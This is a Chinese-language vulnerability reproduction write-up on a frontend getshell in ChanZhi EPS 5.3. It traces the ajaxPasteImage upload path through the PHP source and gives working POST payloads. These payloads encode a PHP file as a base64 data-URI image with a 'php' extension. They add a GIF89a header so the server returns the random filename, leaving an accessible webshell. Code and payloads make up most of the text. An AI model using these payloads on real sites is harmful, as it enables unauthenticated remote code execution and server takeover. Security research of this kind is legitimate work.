>继续漏洞复现

**5.3版本前台getshell**
**/system/module/file/control.php**
```php
public function ajaxPasteImage($uid)
    {
        if($_POST)
        {
            echo $this->file->pasteImage($this->post->editor, $uid);
        }
    }
```
**/system/module/file/model.php**
```php
public function pasteImage($data, $uid)
    {
        $data = str_replace('\"', '"', $data);

        if(!$this->checkSavePath()) return false;

        ini_set('pcre.backtrack_limit', strlen($data));
        preg_match_all('/<img src="(data:image\/(\S+);base64,(\S+))" .+ \/>/U', $data, $out);
        foreach($out[3] as $key => $base64Image)
        {
            $imageData = base64_decode($base64Image);
            $imageSize = array('width' => 0, 'height' => 0);

            $file['id']        = $key;
            $file['extension'] = $out[2][$key];
            $file['size']      = strlen($imageData);
            $file['addedBy']   = $this->app->user->account;
            $file['addedDate'] = helper::today();
            $file['title']     = basename($file['pathname']);
            $file['pathname']  = $this->setPathName($file);
            $file['editor']    = 1;

            file_put_contents($this->savePath . $file['pathname'], $imageData);

            $this->compressImage($this->savePath . $file['pathname']);

            $imageSize      = $this->getImageSize($this->savePath . $file['pathname']);
            $file['width']  = $imageSize['width'];
            $file['height'] = $imageSize['height'];
            $file['lang']   = 'all';

            $this->dao->insert(TABLE_FILE)->data($file)->exec();
            $_SESSION['album'][$uid][] = $this->dao->lastInsertID();

            $data = str_replace($out[1][$key], $this->webPath . $file['pathname'], $data);
        }
        return $data;
    }
```
可见，我们对控制的文件名为$file['pathname']和进过一系列变换的$imageDate，就目前来看文件的后缀是我们可以控制的，跟进**$this->setPathName**
```php
public function setPathName($file, $objectType = 'upload')
    {
        if(strpos('slide,source', $objectType) === false)
        {
            $sessionID  = session_id();
            $randString = substr($sessionID, mt_rand(0, strlen($sessionID) - 5), 3);
            $pathName   = date('Ym/dHis', $this->now) . $file['id'] . mt_rand(0, 10000) . $randString;
        }
        elseif($objectType == 'source') 
        {
            /* Process file path if objectType is source. */
            $template = $this->config->template->{$this->app->clientDevice}->name;
            $theme    = $this->config->template->{$this->app->clientDevice}->theme;
            return "source/{$template}/{$theme}/{$file['title']}.{$file['extension']}";
        }
        
        /* rand file name more */
        list($path, $fileName) = explode('/', $pathName);
        $fileName = md5(mt_rand(0, 10000) . str_shuffle(md5($fileName)) . mt_rand(0, 10000));
        return $path . '/f_' . $fileName . '.' . $file['extension'];
    }
```
可见这个函数对我们的后缀名没有干扰，但是其会生成随机的文件名，一开始我是用'**<?php phpinfo()?>**'base64编码后的poc
```url
http://127.0.0.1/chanzhieps/www/index.php?m=file&f=ajaxPasteImage
post:editor=/<img src="data:image/php;base64,PD9waHAgcGhwaW5mbygpPz4="    />
```
发现虽然成功写入webshell文件，但是，由于文件名太随机了，没办法访问，看见原文的作者说在webshell前加入gif89a头可以返回文件名，于是尝试了
'**GIF89a
<?php phpinfo()?>**'
base64后的编码，成功返回
```url
http://127.0.0.1/chanzhieps/www/index.php?m=file&f=ajaxPasteImage
post:editor=/<img src="data:image/php;base64,R0lGODlhCjw/cGhwIHBocGluZm8oKT8+"    />
```
究其原因，是因为其有个**$this->compressImage**操作，有兴趣的小伙伴可以去看看，是一个用gd，或者imagick库压缩图片的函数，我猜是库函数判断是非为图片抛出的异常